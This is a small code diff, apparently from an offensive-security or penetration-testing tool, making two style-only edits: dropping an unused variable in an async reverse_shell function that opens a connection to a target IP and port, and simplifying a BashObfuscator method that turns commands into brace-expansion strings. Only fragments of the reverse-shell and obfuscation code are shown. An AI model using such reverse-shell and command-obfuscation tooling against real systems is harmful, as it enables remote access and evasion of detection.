@@ -114,7 +114,7 @@ async def reverse_shell(
 
     try:
         logger.debug(f"Attempting connection to {target_ip}:{target_port}")
-        reader, writer = await asyncio.wait_for(
+        _, writer = await asyncio.wait_for(
             asyncio.open_connection(target_ip, target_port),
             timeout=timeout
         )
@@ -749,7 +749,7 @@ class BashObfuscator:
         
         # Create brace expansion
         cmd = parts[0]
-        result = '{' + ','.join(c for c in cmd) + '}'
+        result = '{' + ','.join(list(cmd)) + '}'
         return ' '.join([result] + parts[1:])
     
     @staticmethod
